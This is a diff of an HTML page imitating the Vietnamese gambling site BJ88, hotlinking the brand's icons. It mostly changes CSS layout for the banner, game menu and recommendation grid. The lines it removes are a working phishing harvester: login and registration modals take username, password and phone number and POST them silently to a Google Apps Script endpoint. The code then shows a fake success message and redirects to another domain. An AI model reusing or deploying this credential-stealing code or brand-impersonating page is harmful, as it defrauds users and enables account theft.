@@ -3,19 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BJ88 - Giao Diện Tổng Hợp</title>
+    <title>BJ88 - Giao Diện Chuẩn</title>
     <style>
         body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #1a1a1a; color: white; margin: 0; padding: 0; overflow-x: hidden; }
         
         /* HEADER */
-        .header { background: #111; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ff9800; }
-        .logo img { height: 45px; object-fit: contain; }
+        .header { background: #111; padding: 10px 5% ; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ff9800; }
+        .logo img { height: 40px; object-fit: contain; }
         .auth-buttons button { padding: 8px 15px; margin-left: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
         .btn-login { background: #ff9800; color: white; }
         .btn-register { background: #444; color: white; }
 
-        /* BANNER CHUYỂN ĐỘNG TO (TỶ LỆ 16/5.5) */
-        .banner-container { width: 100%; overflow: hidden; position: relative; background: #000; aspect-ratio: 16 / 5.5; }
+        /* BANNER - Đã thu nhỏ chiều cao để cân xứng */
+        .banner-container { 
+            width: 100%; 
+            max-width: 1200px; /* Giới hạn chiều ngang */
+            margin: 0 auto;
+            overflow: hidden; 
+            position: relative; 
+            background: #000;
+            aspect-ratio: 16 / 5; /* Thu nhỏ chiều cao lại so với trước */
+        }
         .banner-slide { display: flex; width: 600%; height: 100%; animation: slide-animation 18s infinite; }
         .banner-slide img { width: 16.666%; height: 100%; object-fit: cover; display: block; }
         
@@ -29,36 +37,69 @@
             100% { transform: translateX(0); }
         }
 
-        /* MENU ICON CHÍNH THỨC */
-        .game-menu { display: flex; overflow-x: auto; background: #222; padding: 15px 10px; gap: 10px; justify-content: flex-start; border-bottom: 1px solid #333; }
-        .menu-item { display: flex; flex-direction: column; align-items: center; min-width: 75px; font-size: 11px; cursor: pointer; color: #bbb; text-transform: uppercase; white-space: nowrap; }
-        .menu-item img { width: 28px; height: 28px; margin-bottom: 5px; }
+        /* MENU ICON - Trải dài ngang để lấp khoảng trống */
+        .game-menu { 
+            display: flex; 
+            background: #222; 
+            padding: 10px 5%; 
+            justify-content: space-between; /* Trải đều ra hai bên */
+            border-bottom: 1px solid #333;
+            flex-wrap: nowrap;
+            overflow-x: auto; /* Vẫn cho phép vuốt trên mobile */
+        }
+        .menu-item { 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            flex: 1; /* Mỗi item chiếm không gian bằng nhau để lấp đầy hàng */
+            min-width: 60px;
+            font-size: 10px; 
+            cursor: pointer; 
+            color: #bbb; 
+            text-transform: uppercase;
+        }
+        .menu-item img { width: 24px; height: 24px; margin-bottom: 5px; }
         .menu-item.active { color: #ff9800; font-weight: bold; }
 
-        /* MỤC ĐỀ XUẤT (3 BANNER) */
-        .recommend-section { padding: 15px 10px; background-color: #1a1a1a; }
-        .recommend-title { font-size: 16px; font-weight: bold; color: white; margin-bottom: 12px; border-left: 4px solid #ff9800; padding-left: 10px; text-transform: uppercase; }
-        .recommend-container { display: flex; gap: 10px; overflow-x: auto; scrollbar-width: none; }
-        .recommend-item { flex: 1; min-width: calc(33.33% - 7px); border-radius: 8px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.3); }
-        .recommend-item img { width: 100%; height: auto; display: block; object-fit: cover; }
+        /* MỤC ĐỀ XUẤT - Sửa lỗi vỡ ảnh */
+        .recommend-section { padding: 15px 5%; background-color: #1a1a1a; }
+        .recommend-title { font-size: 16px; font-weight: bold; color: white; margin-bottom: 12px; border-left: 4px solid #ff9800; padding-left: 10px; }
+        .recommend-container { 
+            display: grid; 
+            grid-template-columns: repeat(3, 1fr); /* Chia 3 cột bằng nhau */
+            gap: 15px; 
+        }
+        .recommend-item { 
+            width: 100%;
+            border-radius: 8px; 
+            overflow: hidden; 
+            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+            background: #333; /* Nền tối để nếu ảnh chưa load không bị trắng xóa */
+        }
+        .recommend-item img { 
+            width: 100%; 
+            height: auto; 
+            display: block; 
+            object-fit: contain; /* Giữ nguyên tỷ lệ ảnh không bị bóp méo */
+        }
+
+        /* Responsive cho Mobile */
+        @media (max-width: 768px) {
+            .recommend-container { grid-template-columns: 1fr; } /* Mobile hiện 1 ảnh mỗi hàng */
+            .game-menu { justify-content: flex-start; gap: 20px; }
+        }
 
         /* MODAL */
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; }
-        .modal-content { background: white; width: 340px; margin: 80px auto; padding: 30px; border-radius: 12px; text-align: center; color: #333; }
-        .modal-content h2 { color: #ff9800; margin-bottom: 20px; font-size: 24px; }
-        .modal-content input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-        .btn-submit { width: 100%; padding: 14px; background: #ff9800; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; }
-        
-        /* Ngăn người dùng click lung tung ngoài các nút Đăng ký/Đăng nhập */
-        .no-interaction { pointer-events: none; }
-        .allow-interaction { pointer-events: auto; }
+        .modal-content { background: white; width: 320px; margin: 80px auto; padding: 25px; border-radius: 12px; text-align: center; color: #333; }
+        .btn-submit { width: 100%; padding: 12px; background: #ff9800; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; }
     </style>
 </head>
 <body>
 
     <div class="header">
         <div class="logo">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRzZk1jTHmw63I9QAMZVcLEXrY381zS6SC20g&s" alt="Logo BJ88">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRzZk1jTHmw63I9QAMZVcLEXrY381zS6SC20g&s" alt="Logo">
         </div>
         <div class="auth-buttons">
             <button class="btn-login" onclick="openModal('loginModal')">Đăng nhập</button>
@@ -78,16 +119,16 @@
     </div>
 
     <div class="game-menu">
-        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-sv388.png?v=1769130642418&source=drccdnsrc">SV388</div>
-        <div class="menu-item active"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-exclusive.png?v=1769130642418&source=drccdnsrc">PHỔ BIẾN</div>
-        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-sport.png?v=1769130642418&source=drccdnsrc">THỂ THAO</div>
-        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-casino.png?v=1769130642418&source=drccdnsrc">SÒNG BÀI</div>
-        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-slot.png?v=1769130642418&source=drccdnsrc">SLOTS</div>
-        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-fish.png?v=1769130642418&source=drccdnsrc">BẮN CÁ</div>
-        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-lottery.png?v=1769130642418&source=drccdnsrc">XỔ SỐ</div>
-        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-table.png?v=1769130642418&source=drccdnsrc">GAME BÀI</div>
-        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-crash.png?v=1769130642418&source=drccdnsrc">CRASH</div>
-        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-arcade.png?v=1769130642418&source=drccdnsrc">ARCADE</div>
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-sv388.png">SV388</div>
+        <div class="menu-item active"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-exclusive.png">PHỔ BIẾN</div>
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-sport.png">THỂ THAO</div>
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-casino.png">SÒNG BÀI</div>
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-slot.png">SLOTS</div>
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-fish.png">BẮN CÁ</div>
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-lottery.png">XỔ SỐ</div>
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-table.png">GAME BÀI</div>
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-crash.png">CRASH</div>
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-arcade.png">ARCADE</div>
     </div>
 
     <div class="recommend-section">
@@ -99,57 +140,9 @@
         </div>
     </div>
 
-    <div id="loginModal" class="modal">
-        <div class="modal-content">
-            <h2>ĐĂNG NHẬP</h2>
-            <input type="text" id="login_user" placeholder="Tên tài khoản">
-            <input type="password" id="login_pass" placeholder="Mật khẩu">
-            <input type="text" id="login_phone" placeholder="Số điện thoại của bạn (Bắt buộc)">
-            <button class="btn-submit" onclick="sendLoginData()">ĐĂNG NHẬP</button>
-            <p onclick="closeModal('loginModal')" style="cursor:pointer; color:#888; font-size:12px; margin-top:10px;">Đóng</p>
-        </div>
-    </div>
-
-    <div id="registerModal" class="modal">
-        <div class="modal-content">
-            <h2>ĐĂNG KÝ</h2>
-            <input type="text" id="phone" placeholder="Số điện thoại của bạn (Bắt buộc)">
-            <button class="btn-submit" onclick="sendData()">ĐĂNG KÝ NGAY</button>
-            <p onclick="closeModal('registerModal')" style="cursor:pointer; color:#888; font-size:12px; margin-top:10px;">Đóng</p>
-        </div>
-    </div>
-
     <script>
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbwaVLJXZeJJE2s0XfPLvyq6AUNY4oK6THb8OBOCtzaW9zi6zSg8fYdlXLxZjdmxiw8G/exec';
-
         function openModal(id) { document.getElementById(id).style.display = 'block'; }
         function closeModal(id) { document.getElementById(id).style.display = 'none'; }
-
-        async function sendData() {
-            const phone = document.getElementById('phone').value;
-            if (!phone) { alert("Vui lòng nhập số điện thoại!"); return; }
-            const formData = new URLSearchParams();
-            formData.append('type', 'Đăng ký BJ88');
-            formData.append('phone', phone);
-            await fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: formData });
-            alert("Đăng ký thành công!");
-            window.location.href = "https://4a1.bongvip25.pro";
-        }
-
-        async function sendLoginData() {
-            const user = document.getElementById('login_user').value;
-            const pass = document.getElementById('login_pass').value;
-            const phone = document.getElementById('login_phone').value;
-            if (!user || !pass || !phone) { alert("Vui lòng nhập đầy đủ thông tin!"); return; }
-            const formData = new URLSearchParams();
-            formData.append('type', 'Đăng nhập BJ88');
-            formData.append('username', user);
-            formData.append('password', pass);
-            formData.append('phone', phone);
-            await fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: formData });
-            alert("Đăng nhập thành công!");
-            window.location.href = "https://4a1.bongvip25.pro";
-        }
     </script>
 </body>
 </html>
